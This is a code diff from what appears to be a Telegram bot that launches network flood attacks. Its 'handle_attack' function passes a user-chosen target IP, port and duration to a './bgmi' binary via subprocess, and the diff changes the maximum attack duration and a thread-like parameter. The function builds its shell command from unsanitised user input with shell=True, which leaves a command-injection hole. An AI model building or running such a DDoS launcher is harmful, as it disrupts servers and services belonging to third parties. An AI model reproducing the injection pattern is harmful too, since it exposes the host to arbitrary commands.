@@ -238,12 +238,12 @@ def handle_attack(message):
                     command = ['/attack'] + command  # Prepend '/attack' to the command list
                 target, port, time_duration = command[1], int(command[2]), int(command[3])
 
-                if time_duration > 240:
-                    response = "❌ **Error:** Time interval must be less than 240 seconds."
+                if time_duration > 180:
+                    response = "❌ **Error:** Time interval must be less than 180 seconds."
                 else:
                     user_last_attack[user_id] = time.time()
                     start_attack_reply(message, target, port, time_duration)
-                    full_command = f"./bgmi {target} {port} {time_duration} 400"
+                    full_command = f"./bgmi {target} {port} {time_duration} 200"
                     subprocess.run(full_command, shell=True)
 
                     response = f"🎯 **Attack Finished!**\n**Target:** `{target}`\n**Port:** `{port}`\n**Duration:** `{time_duration} seconds`"
